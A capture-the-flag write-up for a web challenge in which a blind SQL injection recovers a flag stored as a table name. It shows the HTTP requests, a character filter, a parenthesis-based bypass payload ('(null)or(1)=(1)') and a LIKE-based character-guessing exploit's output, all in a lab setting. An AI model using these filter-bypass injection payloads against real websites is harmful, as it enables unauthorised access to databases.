# WEB200
## Description
San Tzu Said : 

"Einstein would have been a good DBA, too ... 
What a DBA team : Shakespeare and Einstein ...
But who they will name tables ? that'is the question"

## Solution
According to the challenge's description, the flag in the name of a table (starting with FLAG_).
So We need to exploit an SQL injection to resolve this challenge.

We start by injecting a simple quote in the id parametre using the folowing HTTP request :

```
GET /index.php?id=%27 HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:20.0) Gecko/20100101 Firefox/20.0 Iceweasel/20.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

But it seems that there is a filtering mechanism which block/detecte malicious charcters :

```
HTTP/1.1 200 OK
Date: Sat, 30 May 2015 22:45:40 GMT
Server: Apache
Vary: Accept-Encoding
Content-Length: 17
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

Attack Detected !
```

First, we need to determine what pattern is used by the target in order to bypass it later. For example, we can try to inject all possible ascii code and compre response :

```
tmr@desktop:~$ python pattern_detector.py
[+]   is filtred  //whitespace
[+] " is filtred  //quotes
[+] ' is filtred
[+] / is filtred  // slashe
[+] \ is filtred  // anti-slashe
```

As you can see above whitespace slaches and quotes are all catched by the target. But MySQL offer the possibility to avoid whitespaces by using parenthesis to seperate SQL keywords. 

For example, you can inject a boolean expression :


```
GET /index.php?id=(null)or(1)=(1) HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:20.0) Gecko/20100101 Iceweasel
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

We get a valid reponse from the server (the profil page is displyed correctly) :

```
HTTP/1.1 200 OK
Date: Sat, 30 May 2015 23:23:37 GMT
Server: Apache
Vary: Accept-Encoding
Content-Length: 3827
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html


<!doctype html>
<html lang="en-US">
<head>
  <meta charset="utf-8">
  <meta http-equiv="Content-Type" content="text/html">
  <title>User Profile s...
```

Then, you can craft your own exploit to guess the table name :


```
tmr@desktop:~$ python exploit.py 
[+] Blind SQL Injection Exploit Using LIKE Technic 
[+] New Guessed Char : E
FLAG_E
[+] New Guessed Char : N
FLAG_EN
[+] New Guessed Char : T
FLAG_ENT
[+] New Guessed Char : A
FLAG_ENTA
[+] New Guessed Char : Y
FLAG_ENTAY
[+] New Guessed Char : A
FLAG_ENTAYA
[+] New Guessed Char : _
FLAG_ENTAYA_
[+] New Guessed Char : M
FLAG_ENTAYA_M
[+] New Guessed Char : 3
FLAG_ENTAYA_M3
[+] New Guessed Char : A
FLAG_ENTAYA_M3A
[+] New Guessed Char : L
FLAG_ENTAYA_M3AL
[+] New Guessed Char : E
FLAG_ENTAYA_M3ALE
[+] New Guessed Char : M
FLAG_ENTAYA_M3ALEM
```

That's it !
